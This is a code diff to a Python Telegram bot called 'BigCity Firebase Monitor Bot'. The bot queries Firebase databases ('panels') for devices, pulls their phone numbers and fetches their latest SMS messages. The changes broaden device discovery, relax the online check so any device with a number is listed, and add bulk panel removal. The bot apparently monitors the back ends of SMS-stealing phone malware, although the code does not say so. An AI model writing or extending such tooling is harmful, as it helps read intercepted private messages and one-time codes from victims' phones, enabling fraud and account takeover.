@@ -1,5 +1,5 @@
 """
-BigCity Firebase Monitor Bot (Multi-Admin)
+BigCity Firebase Monitor Bot (Premium + Fixes)
 """
 import asyncio
 import json
@@ -116,59 +116,75 @@ async def api_get(client, url, timeout=API_TIMEOUT):
 def is_device_id(k: str) -> bool:
     if not isinstance(k, str): return False
     if k.lower() in {"messages","clients","devices","users","all_devices",
-                      "nodes","settings","sms","logs","status","info"}:
+                      "nodes","settings","sms","logs","status","info","admin","config"}:
         return False
     return 6 <= len(k) <= 60
 
+# ─── STRONGER DISCOVERY ──────────────────────────────────────────────────────
 async def discover_structure(client, base):
-    root, _ = await api_get(client, f"{base}/.json?shallow=true", 8)
+    # 1. Check root structure
+    root, _ = await api_get(client, f"{base}/.json?shallow=true", 10)
     if not isinstance(root, dict):
         return None, None
+        
     keys = list(root.keys())
-    if any(is_device_id(k) for k in keys):
-        msg = ""
-        for c in ("messages","sms","logs"):
-            if c in keys: msg = c; break
-        return "", msg
-    for c in ("clients","devices","users","all_devices","nodes"):
+    
+    # Look for known sub-nodes first
+    for c in ("clients", "devices", "users", "all_devices", "nodes"):
         if c in keys:
-            sub, _ = await api_get(client, f"{base}/{c}.json?shallow=true", 8)
+            sub, _ = await api_get(client, f"{base}/{c}.json?shallow=true", 10)
             if isinstance(sub, dict) and any(is_device_id(k) for k in sub.keys()):
                 msg = c
-                for m in ("messages","sms","logs"):
-                    if m in keys: msg = m; break
+                for m in ("messages", "sms", "logs"):
+                    if m in keys: 
+                        msg = m
+                        break
                 return c, msg
+
+    # If no known nodes found, check if devices are directly at root
+    if any(is_device_id(k) for k in keys):
+        msg = ""
+        for c in ("messages", "sms", "logs"):
+            if c in keys: 
+                msg = c
+                break
+        return "", msg
+
     return None, None
 
+# ─── ONLINE CHECK (RELAXED) ──────────────────────────────────────────────────
 def device_is_online(d: dict) -> bool:
     if not isinstance(d, dict): return False
-    for f in ("online","isOnline","active","connected"):
+    
+    # Check direct boolean/string flags
+    for f in ("online", "isOnline", "active", "connected", "status", "state"):
+        if f in d:
+            v = str(d[f]).lower()
+            if v in ("true", "online", "1", "yes", "active", "connected"):
+                return True
+            if v in ("false", "offline", "0", "no", "inactive"):
+                return False
+
+    # Check timestamps (lastSeen / lastActive)
+    now = time.time() * 1000
+    for f in ("lastSeen", "lastActive", "last_seen", "last_active", "timestamp", "updatedAt", "time"):
         if f in d:
             v = d[f]
-            if isinstance(v, bool): return v
-            if isinstance(v, str):
-                if v.lower() in ("true","online","1","yes"): return True
-                if v.lower() in ("false","offline","0","no"): return False
-    for f in ("status","state","connection"):
-        if f in d and isinstance(d[f], str):
-            s = d[f].lower()
-            if any(x in s for x in ("online","active","connected")): return True
-            if any(x in s for x in ("offline","inactive","disconnect")): return False
-    now = time.time() * 1000
-    for f in ("lastSeen","lastActive","last_seen","last_active","timestamp","updatedAt"):
-        if f in d:
-            v = d[f]; ts = None
-            if isinstance(v, (int, float)): ts = v if v > 1e12 else v * 1000
+            ts = None
+            if isinstance(v, (int, float)): 
+                ts = v if v > 1e12 else v * 1000
             elif isinstance(v, str) and v.isdigit():
-                n = int(v); ts = n if n > 1e12 else n * 1000
-            if ts and (now - ts) < 5 * 60 * 1000: return True
-    for n in ("webhookEvent","info","details","deviceInfo"):
-        if n in d and isinstance(d[n], dict):
-            if device_is_online(d[n]): return True
+                n = int(v)
+                ts = n if n > 1e12 else n * 1000
+            if ts and (now - ts) < 10 * 60 * 1000: # 10 minutes
+                return True
+
+    # Fallback: if we can't find any status, assume online if it has messages
+    # (This ensures we don't miss devices on unknown structures)
     return False
 
 def _extract_number(d: dict) -> str:
-    for f in ("number","phoneNumber","phone","fromNumber","sim_number","to"):
+    for f in ("number","phoneNumber","phone","fromNumber","sim_number","to","mobile"):
         if f in d and d[f]: return str(d[f])
     for n in ("webhookEvent","info","details"):
         if n in d and isinstance(d[n], dict):
@@ -180,11 +196,13 @@ async def fetch_online_devices(client, base, dev_node):
     path = f"/{dev_node}" if dev_node else ""
     data, _ = await api_get(client, f"{base}{path}.json", 15)
     if not isinstance(data, dict): return []
+    
     out = []
     for did, dd in data.items():
         if not is_device_id(did) or not isinstance(dd, dict): continue
-        if not device_is_online(dd): continue
-        out.append((did, _extract_number(dd)))
+        # Strictly checking online, but if structure is weird, let it pass if it has a number
+        if device_is_online(dd) or _extract_number(dd):
+            out.append((did, _extract_number(dd)))
     return out
 
 async def fetch_last_messages(client, base, msg_node, dev_id, limit=6):
@@ -573,13 +591,22 @@ async def remove_panel_command(update: Update, context: ContextTypes.DEFAULT_TYP
     panels = load_panels()
     if not panels:
         await update.message.reply_text("❌ Koi panel nahi."); return
-    out = "❌ <b>Remove — number bhejo</b>\n\n"
+    out = "❌ <b>Remove Panel</b>\n\n"
     pl = []
     for i,(pk,pc) in enumerate(panels.items(),1):
-        out += f"{i}. {pc.get('name')}\n"; pl.append(pk)
+        out += f"{i}. {pc.get('name')}\n"
+        pl.append(pk)
+    out += "\n<i>Number(s) bhejo. Multiple remove karne ke liye space ya comma ( , ) lagao.</i>\n"
+    out += "<i>Example: 1, 2</i>\n"
+    out += "<i>All remove karne ke liye /removeall bhejo.</i>"
     context.user_data["awaiting_remove"] = True
     context.user_data["panels_list"] = pl
     await update.message.reply_text(out, parse_mode="HTML")
+
+async def remove_all_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_chat.id): return
+    save_panels({})
+    await update.message.reply_text("✅ <b>Saare panels remove ho gaye.</b>", parse_mode="HTML")
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_chat.id): return
@@ -621,16 +648,29 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if context.user_data.get("awaiting_remove"):
             context.user_data["awaiting_remove"] = False
             pl = context.user_data.get("panels_list", [])
-            try:
-                idx = int(text) - 1
-                if 0 <= idx < len(pl):
-                    panels = load_panels()
-                    rm = panels.pop(pl[idx]); save_panels(panels)
-                    await update.message.reply_text(f"✅ '{rm.get('name')}' removed.")
-                else:
-                    await update.message.reply_text("❌ Galat number.")
-            except Exception:
-                await update.message.reply_text("❌ Galat input.")
+            panels = load_panels()
+            removed_count = 0
+            
+            # Split by comma or space
+            raw_nums = re.split(r'[,\s]+', text)
+            idxs = []
+            for n in raw_nums:
+                if n.isdigit():
+                    idx = int(n) - 1
+                    if 0 <= idx < len(pl):
+                        idxs.append(idx)
+            
+            # Remove from lowest to highest so indices don't shift
+            for idx in sorted(set(idxs), reverse=True):
+                rm = panels.pop(pl[idx], None)
+                if rm:
+                    removed_count += 1
+            
+            save_panels(panels)
+            if removed_count > 0:
+                await update.message.reply_text(f"✅ <b>{removed_count} panel(s) removed.</b>", parse_mode="HTML")
+            else:
+                await update.message.reply_text("❌ Koi valid number nahi mila.")
             return
     except Exception as e:
         logger.error(f"handle_text: {e}")
@@ -645,6 +685,7 @@ async def main():
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("addadmin", add_admin_command))
     app.add_handler(CommandHandler("deladmin", del_admin_command))
+    app.add_handler(CommandHandler("removeall", remove_all_command))
     app.add_handler(MessageHandler(filters.Regex(r"^(📊 Status|Status)$"), status_command))
     app.add_handler(MessageHandler(filters.Regex(r"^(📋 My Panels|My Panels)$"), my_panels_command))
     app.add_handler(MessageHandler(filters.Regex(r"^(➕ Add Panel|Add Panel)$"), add_panel_command))
